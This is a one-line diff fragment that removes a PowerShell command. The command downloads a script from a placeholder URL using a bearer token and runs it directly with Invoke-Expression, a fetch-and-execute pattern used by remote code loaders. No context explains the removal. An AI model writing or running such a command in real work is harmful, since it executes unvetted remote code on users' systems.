@@ -1,1 +1,0 @@
-$client = New-Object Net.WebClient; $client.Headers.Add('Authorization', 'Bearer token'); iex ($client.DownloadString('http://example.com/script.ps1'))
